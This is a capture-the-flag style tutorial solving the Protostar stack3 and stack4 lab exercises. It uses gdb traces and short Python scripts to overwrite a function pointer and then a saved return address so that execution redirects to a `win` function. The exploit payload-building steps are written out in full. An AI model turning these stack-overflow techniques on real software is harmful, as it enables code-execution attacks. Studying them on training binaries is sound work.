# Buffer Overflows Can Redirect Program Execution - bin 0x0D

## Target Exercises

- [stack3](https://exploit-exercises.lains.space/protostar/stack3/)
- [stack4](https://exploit-exercises.lains.space/protostar/stack4/)

## Usage

Download `exploit-exercises-protostar-2.iso` from the [Protostar Google Drive directory](https://drive.google.com/folderview?id=0B9RbZkKdRR8qbkJjQ2VXbWNlQzg&usp=sharing).

```
/bin/bash
/opt/protostar/bin/stack3
AAAA
```

## Instructions

Use `gdb` to e(x)amine or (p)rint where the `win` function lies in memory (here `0x8048424`). Then `set disassembly-flavor intel` and `disassemble main` to see what `main` does.
```
user@protostar:~$ gdb /opt/protostar/bin/stack3
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack3...done.
(gdb) x win
0x8048424 <win>:	0x83e58955
(gdb) p win
$1 = {void (void)} 0x8048424 <win>
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
0x08048438 <main+0>:	push   ebp
0x08048439 <main+1>:	mov    ebp,esp
0x0804843b <main+3>:	and    esp,0xfffffff0
0x0804843e <main+6>:	sub    esp,0x60
0x08048441 <main+9>:	mov    DWORD PTR [esp+0x5c],0x0
0x08048449 <main+17>:	lea    eax,[esp+0x1c]
0x0804844d <main+21>:	mov    DWORD PTR [esp],eax
0x08048450 <main+24>:	call   0x8048330 <gets@plt>
0x08048455 <main+29>:	cmp    DWORD PTR [esp+0x5c],0x0
0x0804845a <main+34>:	je     0x8048477 <main+63>
0x0804845c <main+36>:	mov    eax,0x8048560
0x08048461 <main+41>:	mov    edx,DWORD PTR [esp+0x5c]
0x08048465 <main+45>:	mov    DWORD PTR [esp+0x4],edx
0x08048469 <main+49>:	mov    DWORD PTR [esp],eax
0x0804846c <main+52>:	call   0x8048350 <printf@plt>
0x08048471 <main+57>:	mov    eax,DWORD PTR [esp+0x5c]
0x08048475 <main+61>:	call   eax
0x08048477 <main+63>:	leave
0x08048478 <main+64>:	ret
End of assembler dump.
(gdb)
```

Exactly like `stack0`, it makes space for 0x60 (96) bytes on the stack. Then it sets `esp+0x5c` to `0` so that it is the location of the `fp` variable. After the `gets` it checks whether the value at `esp+0x5c` is still `0`. If not, it loads the value into `eax` and calls that address, effectively calling `fp` (and `win` if the addresses match).

Let's set a breakpoint at just before this last call at `0x08048475`. Then (r)un the program and enter enough characters to overwrite the value of `fp` on the stack. Display the registers to confirm `eax` is set to `Ox41414141` (the ASCII value of the capital A's):
```
(gdb) break *0x08048475
Breakpoint 1 at 0x8048475: file stack3/stack3.c, line 22.
(gdb) r
Starting program: /opt/protostar/bin/stack3
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
calling function pointer, jumping to 0x41414141

Breakpoint 1, 0x08048475 in main (argc=1, argv=0xbffff824) at stack3/stack3.c:22
22	stack3/stack3.c: No such file or directory.
	in stack3/stack3.c
(gdb) info registers
eax            0x41414141	1094795585
ecx            0x0	0
edx            0xb7fd9340	-1208118464
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff710	0xbffff710
ebp            0xbffff778	0xbffff778
esi            0x0	0
edi            0x0	0
eip            0x8048475	0x8048475 <main+61>
eflags         0x200292	[ AF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb)
```

Confirm the next instruction tries to call this address and fails with a Segmentation Fault because the memory there does not contain anything valid.
```
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) info registers
eax            0x41414141	1094795585
ecx            0x0	0
edx            0xb7fd9340	-1208118464
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff70c	0xbffff70c
ebp            0xbffff778	0xbffff778
esi            0x0	0
edi            0x0	0
eip            0x41414141	0x41414141
eflags         0x210292	[ AF SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb)
```

Open a second SSH session in a separate terminal to create a Python script for our exploit:
```
cd /tmp
vim stack.py
```

Let's first try to figure out which offset controls `eax` by printing a recognizable pattern:
```
print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
```

Pipe this output to a file so we do not have to type it every time:
```
python stack.py > exp
```

Then feed the file to `stack3` in  `gdb` with:
```
(gdb) r < /tmp/exp
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/stack3 < /tmp/exp
calling function pointer, jumping to 0x51515151

Breakpoint 1, 0x08048475 in main (argc=1448498774, argv=0x57575757)
    at stack3/stack3.c:22
22	in stack3/stack3.c
(gdb)
```

Note how `eax` is filled with `Ox51`'s, the ASCII value of capital Q, as confirmed by chr(0x51) in a python prompt:
```
Python 2.6.6 (r266:84292, Dec 27 2010, 00:02:40)
[GCC 4.4.5] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> chr(0x51)
'Q'
>>>
```

So now we know which offset modifies `eax`. Let's rewrite the code in `stack.py` a little bit:
```
# The characters before the capital Q's are irrelevant, just for padding
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP"
# Now insert the address of the function to call, in little endian (so in reverse compared to the output of `x win` in gdb)
padding += "\x24\x84\x04\x08" # 0x8048424 (note the extra zero at the beginning as the address is only 7-character long)
print padding
```

Save the output to `/tmp/exp` again and feed it to `stack3` to confirm `eax` contains the address of `win`:
```
(gdb) r < /tmp/exp
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/stack3 < /tmp/exp
calling function pointer, jumping to 0x08048424

Breakpoint 1, 0x08048475 in main (argc=1, argv=0xbffff824) at stack3/stack3.c:22
22	in stack3/stack3.c
(gdb) info registers
eax            0x8048424	134513700
ecx            0x0	0
edx            0xb7fd9340	-1208118464
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff710	0xbffff710
ebp            0xbffff778	0xbffff778
esi            0x0	0
edi            0x0	0
eip            0x8048475	0x8048475 <main+61>
eflags         0x200292	[ AF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb)
```

Let's (c)ontinue to confirm we get `code flow successfully changed`:
```
(gdb) c
Continuing.
code flow successfully changed

Program exited with code 037.
(gdb)
```

Now let's solve `stack4` in a similar way. This level is our first buffer overflow, where we take advantage of the stack layout. The code does not contain much. There is no function pointer variable we could overwrite, or no local variable. But it sill wants us to execute `win`.

When a function is called, the address where we want to return to will be stored on the stack. So instead of overflowing a local variable, we can simply overflow the return pointer on the stack. When `main` would return, it would read the wrong value and jump there instead.

Let's use the Python code we have written for `stack3` and modify it a bit. Let's make the payload a bit longer and throw it at `stack4`.
```
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
print padding
```

```
python stack.py > alphabet
```

```
user@protostar:/opt/protostar/bin$ gdb stack4
(gdb) r < /tmp/alphabet
Starting program: /opt/protostar/bin/stack4 < /tmp/alphabet

Program received signal SIGSEGV, Segmentation fault.
0x54545454 in ?? ()
(gdb)
```

Segmentation fault at `0x54545454`, so we successfully redirected code execution to bad memory. If you look closely, you can also spot that the base pointer `$ebp` is `0x53535353`, so that one was also overwritten:
```
(gdb) info registers
eax            0xbffff720	-1073744096
ecx            0xbffff720	-1073744096
edx            0xb7fd9334	-1208118476
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff770	0xbffff770
ebp            0x53535353	0x53535353
esi            0x0	0
edi            0x0	0
eip            0x54545454	0x54545454
eflags         0x210246	[ PF ZF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb)
```

The stack looks like:
```
                    BEFORE           AFTER
                    ...              QQQQ
                    ...              RRRR
ebp (Base Pointer)  0xbffff900       SSSS
Return Pointer      0xb7eadc76       TTTT
```

So `T` (or `0x54`) allows us to control the instruction pointer.

This time let's use `objdump` to find the address of the `win` function:
```
user@protostar:/opt/protostar/bin$ objdump -t stack4 | grep win
080483f4 g     F .text	00000014              win
```

This tells us that we need to overwrite the return pointer with `0x080483f4`. Let's modify our Python script and feed it to `stack4`:
```
import struct

# The characters before the capital S's are irrelevant, just for padding
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR"
ebp = "SSSS"  # not relevant either
eip = struct.pack("I", 0x080483f4)
print padding + ebp + eip
```

```
user@protostar:/tmp$ python stack.py | /opt/protostar/bin/stack4
code flow successfully changed
Segmentation fault
```

Success!! We smashed the stack and controlled the instruction pointer. Bu twe still get a segmentation fault? The reason is that after the `win` function is complete, it tries to return to the next value on the stack, which is now some gibberish, and likely not in a valid code area. It will crash eventually but we don't care because we executed what we wanted.
